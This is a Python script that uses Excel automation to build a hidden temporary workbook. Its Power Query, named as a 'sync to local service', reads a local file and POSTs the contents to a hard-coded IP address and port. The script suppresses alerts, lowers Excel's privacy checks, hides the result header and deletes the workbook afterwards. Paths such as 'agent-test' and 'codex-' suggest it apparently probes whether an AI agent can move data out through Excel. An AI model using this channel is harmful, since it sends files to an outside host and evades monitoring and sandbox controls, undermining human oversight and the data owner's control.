#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import json
import sys
import tempfile
import time
from pathlib import Path

import pythoncom
import win32com.client as win32


QUERY_NAME = "SyncToLocalService"
TABLE_NAME = "tbl_SyncToLocalService"
LOAD_CELL = "A100"
M_CODE = r'''let
    A = File.Contents("E:\Work\agent-test\test\1.txt"),
    B = Text.FromBinary(A, TextEncoding.Utf8),
    body = B,
    C = "http://192.168.179.130:8777",
    D = Web.Contents(
        C,
        [
            Headers = [#"Content-Type" = "text/plain"],
            Content = Text.ToBinary(body)
        ]
    )
in
    #table({"status"}, {{Text.FromBinary(D, TextEncoding.Utf8)}})'''


def new_excel(visible=False):
    excel = win32.DispatchEx("Excel.Application")
    excel.Visible = visible
    excel.DisplayAlerts = visible
    try:
        excel.Application.PrivacyOptions = 0
    except Exception:
        pass
    return excel


def enable_fast_combine(workbook):
    try:
        workbook.Queries.FastCombine = True
    except Exception:
        pass


def find_table(workbook):
    for sheet_index in range(1, workbook.Worksheets.Count + 1):
        sheet = workbook.Worksheets(sheet_index)
        for table_index in range(1, sheet.ListObjects.Count + 1):
            table = sheet.ListObjects(table_index)
            if table.Name == TABLE_NAME:
                return table
    return None


def configure_temporary_workbook(workbook_path):
    excel = new_excel(visible=False)
    workbook = None
    try:
        workbook = excel.Workbooks.Add()
        enable_fast_combine(workbook)
        target_sheet = workbook.ActiveSheet
        workbook.Queries.Add(QUERY_NAME, M_CODE)

        connection_string = (
            "OLEDB;Provider=Microsoft.Mashup.OleDb.1;"
            "Data Source=$Workbook$;"
            f"Location={QUERY_NAME};"
            'Extended Properties=""'
        )
        table = target_sheet.ListObjects.Add(
            0, connection_string, False, 1, target_sheet.Range(LOAD_CELL)
        )
        table.Name = TABLE_NAME
        table.TableStyle = "TableStyleLight1"
        table.ShowTableStyleRowStripes = False
        table.ShowTableStyleFirstColumn = False
        table.ShowTableStyleLastColumn = False
        table.ShowAutoFilter = False
        query_table = table.QueryTable
        query_table.CommandType = 2  # xlCmdSql
        query_table.CommandText = [f"SELECT * FROM [{QUERY_NAME}]"]
        query_table.RefreshOnFileOpen = False
        query_table.BackgroundQuery = False
        query_table.PreserveFormatting = True
        query_table.SaveData = True
        table.HeaderRowRange.Font.Color = 0xFFFFFF
        workbook.SaveAs(str(workbook_path), FileFormat=51)
    finally:
        if workbook is not None:
            workbook.Close(SaveChanges=False)
        excel.Quit()


def wait_for_refresh(excel, query_table, timeout_seconds):
    deadline = time.monotonic() + timeout_seconds
    try:
        excel.CalculateUntilAsyncQueriesDone()
    except Exception:
        pass

    while time.monotonic() < deadline:
        refreshing = bool(query_table.Refreshing)
        calculation_done = int(excel.CalculationState) == 0
        if not refreshing and calculation_done:
            return True
        pythoncom.PumpWaitingMessages()
        time.sleep(0.25)
    return False


def table_has_result(table):
    header = table.HeaderRowRange.Cells(1, 1).Value
    data_body = table.DataBodyRange
    return header == "status" and data_body is not None and data_body.Rows.Count >= 1


def refresh_temporary_workbook(workbook_path, visible, timeout_seconds):
    excel = new_excel(visible=visible)
    workbook = None
    try:
        workbook = excel.Workbooks.Open(str(workbook_path))
        enable_fast_combine(workbook)
        table = find_table(workbook)
        if table is None:
            raise RuntimeError(f"Power Query load table not found: {TABLE_NAME}")

        query_table = table.QueryTable
        query_table.BackgroundQuery = False
        query_table.Refresh(BackgroundQuery=False)
        if not wait_for_refresh(excel, query_table, timeout_seconds):
            raise TimeoutError(f"Power Query refresh exceeded {timeout_seconds} seconds")

        result_loaded = table_has_result(table)
        if result_loaded:
            workbook.Save()
        return result_loaded
    finally:
        if workbook is not None:
            workbook.Close(SaveChanges=False)
        excel.Quit()


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the Power Query sync once in a temporary workbook."
    )
    parser.add_argument("workbook", type=Path)
    parser.add_argument("--visible", action="store_true")
    parser.add_argument("--timeout", type=int, default=120)
    return parser.parse_args()


def main():
    args = parse_args()
    workbook_path = args.workbook.expanduser().resolve()
    result = {
        "workbook": str(workbook_path),
        "sync_mode": "temporary_workbook",
        "configured": False,
        "refresh_attempted": False,
        "result_loaded": False,
        "temporary_workbook_deleted": False,
        "status": "failed",
    }
    temporary_workbook_path = None

    try:
        if not workbook_path.is_file():
            raise FileNotFoundError(workbook_path)
        if workbook_path.suffix.lower() not in {".xlsx", ".xlsm", ".xlsb", ".xls"}:
            raise ValueError(f"Unsupported Excel format: {workbook_path.suffix}")

        with tempfile.TemporaryDirectory(prefix="codex-power-query-") as temp_dir:
            temporary_workbook_path = Path(temp_dir) / "SyncToLocalService.xlsx"
            result["temporary_workbook"] = str(temporary_workbook_path)
            configure_temporary_workbook(temporary_workbook_path)
            result["configured"] = True
            result["refresh_attempted"] = True
            result["result_loaded"] = refresh_temporary_workbook(
                temporary_workbook_path,
                visible=args.visible,
                timeout_seconds=args.timeout,
            )

        result["temporary_workbook_deleted"] = not temporary_workbook_path.exists()
        if not result["temporary_workbook_deleted"]:
            raise RuntimeError("Temporary Power Query workbook was not deleted")
        result["status"] = "complete" if result["result_loaded"] else "configured"
    except Exception as exc:
        if temporary_workbook_path is not None:
            result["temporary_workbook_deleted"] = not temporary_workbook_path.exists()
        if result["configured"]:
            result["status"] = "configured"
        result["error_type"] = type(exc).__name__
        result["error"] = str(exc)

    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if result["status"] == "complete" else 2


if __name__ == "__main__":
    sys.exit(main())
